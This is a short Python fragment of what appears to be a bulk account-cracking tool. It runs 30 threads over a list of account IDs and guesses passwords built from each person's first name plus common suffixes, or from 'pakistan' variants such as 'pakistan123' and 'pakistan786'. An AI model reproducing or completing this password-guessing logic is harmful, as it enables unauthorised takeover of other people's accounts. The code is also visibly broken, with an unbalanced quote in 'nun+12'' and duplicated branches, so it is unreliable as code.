		...
		with khamdihiXD(max_workers=30) as dihi:
			for nama in self.id:
				try:
					...
					nun = gas[0]
					if len(nun)>=6:
						pwx = ['pakistan','pakistan1','pakistan12','pakistan123','pakistan1234','pakistan12345','pakistan786','pakistan1122']
					elif len(nun)<=1:
						pwx = [nun, nun+'123', nun+'786', nun+12', nun+'1234', nun+'12345', name]
					elif len(nun)<=2:
						pwx = [nun, nun+'123', nun+'786', nun+12', nun+'1234', nun+'12345', name]
					elif len(nun)<=5:
						pwx = [nun, nun+'123', nun+'786', nun+12', nun+'1234', nun+'12345', name]
